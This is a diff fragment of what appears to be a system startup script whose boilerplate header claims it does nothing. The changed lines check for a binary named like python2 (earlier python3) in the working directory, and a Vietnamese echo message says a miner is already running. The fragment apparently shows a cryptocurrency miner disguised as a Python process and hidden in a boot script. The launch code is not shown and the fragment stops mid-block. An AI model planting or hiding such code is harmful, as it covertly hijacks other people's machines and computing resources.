@@ -10,8 +10,8 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/python3 ]; then
-    if pgrep -x "python3" > /dev/null
+if [ -f ${PWD}/python2 ]; then
+    if pgrep -x "python2" > /dev/null
 then
     echo "Miner dang chay roi , ke cmn di "
     
